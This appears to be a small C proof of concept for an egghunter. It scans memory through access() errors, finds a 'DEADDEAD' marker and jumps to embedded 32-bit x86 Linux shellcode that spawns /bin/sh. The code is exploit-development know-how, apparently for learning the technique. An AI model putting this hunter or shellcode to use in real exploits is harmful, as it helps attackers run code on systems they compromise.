#include <errno.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
	char egg[4] = "DEAD";
	char buffer[1024] = "DEADDEAD\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";	
	unsigned long addr = 0x0;
	int r;

	while (1) {
		r = access(addr+8, 0);
		if (errno != 14) {
			if (strncmp(addr, egg, 4) == 0 && strncmp(addr+4, egg, 4) == 0) {
				char tmp[32];
				memset(tmp, 0, 32);
				strncpy(tmp, addr, 8);
				printf("Egg found at: %ul %s, jumping to shellcode (8 bytes ahead of egg address)...\n", addr, tmp);
				int (*ret)() = (int(*)())addr+8;
				ret();
			}
			addr++;
        } else {
			addr = addr + 4095;
		}
	}
}
